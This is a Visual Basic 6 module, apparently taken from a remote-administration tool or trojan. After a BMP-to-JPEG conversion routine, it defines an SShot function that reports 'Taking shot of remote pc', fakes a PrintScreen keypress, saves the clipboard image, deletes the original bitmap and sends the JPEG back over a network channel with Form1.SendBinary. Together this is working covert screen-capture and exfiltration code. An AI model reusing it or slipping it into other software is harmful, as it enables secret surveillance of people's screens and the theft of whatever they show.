Attribute VB_Name = "bmp2jpg"
Declare Function bmpinfo Lib "VIC32.DLL" (ByVal Fname As String, bdat As BITMAPINFOHEADER) As Long
Declare Function allocimage Lib "VIC32.DLL" (image As imgdes, ByVal wid As Long, ByVal leng As Long, ByVal BPPixel As Long) As Long
Declare Function loadbmp Lib "VIC32.DLL" (ByVal Fname As String, desimg As imgdes) As Long
Declare Sub freeimage Lib "VIC32.DLL" (image As imgdes)
Declare Function convert1bitto8bit Lib "VIC32.DLL" (srcimg As imgdes, desimg As imgdes) As Long
Declare Sub copyimgdes Lib "VIC32.DLL" (srcimg As imgdes, desimg As imgdes)
Declare Function savejpg Lib "VIC32.DLL" (ByVal Fname As String, srcimg As imgdes, ByVal quality As Long) As Long
Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, _
  ByVal dwFlags As Long, ByVal dwExtraInfo As Long)


' Image descriptor
Type imgdes
   ibuff As Long
   stx As Long
   sty As Long
   endx As Long
   endy As Long
   buffwidth As Long
   palette As Long
   colors As Long
   imgtype As Long
   bmh As Long
   hBitmap As Long
End Type

Type BITMAPINFOHEADER
    biSize As Long
    biWidth As Long
    biHeight As Long
    biPlanes As Integer
    biBitCount As Integer
    biCompression As Long
    biSizeImage As Long
    biXPelsPerMeter As Long
    biYPelsPerMeter As Long
    biClrUsed As Long
    biClrImportant As Long
End Type


Public Sub ConvertToJPEG(bmp_fname As String, jpg_fname As String, Optional quality As Long)
   Dim tmpimage As imgdes    ' Image descriptors
   Dim tmp2image As imgdes
   Dim rcode As Long
   'Dim quality As Long
   Dim vbitcount As Long
   Dim bdat As BITMAPINFOHEADER ' Reserve space for BMP struct
   'Dim bmp_fname As String
   'Dim jpg_fname As String

   'bmp_fname = "test.bmp"
   'jpg_fname = "test.jpg"

   If quality = 0 Then quality = 75
   
   ' Get info on the file we're to load
   rcode = bmpinfo(bmp_fname, bdat)
   If (rcode <> NO_ERROR) Then
      Form1.Send "Error: Unable to get file info"
      Exit Sub
   End If
    
   vbitcount = bdat.biBitCount
   If (vbitcount >= 16) Then  ' 16-, 24-, or 32-bit image is loaded into 24-bit buffer
      vbitcount = 24
   End If
   
   ' Allocate space for an image
   rcode = allocimage(tmpimage, bdat.biWidth, bdat.biHeight, vbitcount)
   If (rcode <> NO_ERROR) Then
     Form1.Send "Error: Not enough memory"
     Exit Sub
   End If
   
   ' Load image
   rcode = loadbmp(bmp_fname, tmpimage)
   If (rcode <> NO_ERROR) Then
      freeimage tmpimage ' Free image on error
      Form1.Send "Error: Cannot load file"
      Exit Sub
   End If

   If (vbitcount = 1) Then ' If we loaded a 1-bit image, convert to 8-bit grayscale
       ' because jpeg only supports 8-bit grayscale or 24-bit color images
     rcode = allocimage(tmp2image, bdat.biWidth, bdat.biHeight, 8)
     If (rcode = NO_ERROR) Then
         rcode = convert1bitto8bit(tmpimage, tmp2image)
         freeimage tmpimage  ' Replace 1-bit image with grayscale image
         copyimgdes tmp2image, tmpimage
     End If
   End If

   ' Save image
   rcode = savejpg(jpg_fname, tmpimage, quality)
   freeimage tmpimage
   Kill bmp_fname
   Form1.Send "Picture saved: " & jpg_fname
      
End Sub




Public Function SShot(ByVal theFile As String, CapType As Integer) As Boolean
Form1.Send "Taking shot of remote pc..."

Dim lString As String

On Error GoTo Trap
Clipboard.SetText "TEMPTEXT"

'Check if the File Exist
    If Dir(theFile) <> "" Then Exit Function

    
    If CapType = 1 Then
    Call keybd_event(vbKeySnapshot, 1, 0, 0)
End If

If CapType = 2 Then
    Call keybd_event(vbKeySnapshot, 0, 0, 0)
 End If
 
Sleep 1000

    SavePicture Clipboard.GetData(vbCFBitmap), theFile
Form1.Send "Converting shot.."
ConvertToJPEG theFile, theFile & ".tmp"
Sleep 100
Form1.SendBinary theFile & ".tmp"


SShot = True
Exit Function

Trap:
'Error handling
Form1.Send "Error #: " & Err.Number & ", " & Err.Description

End Function

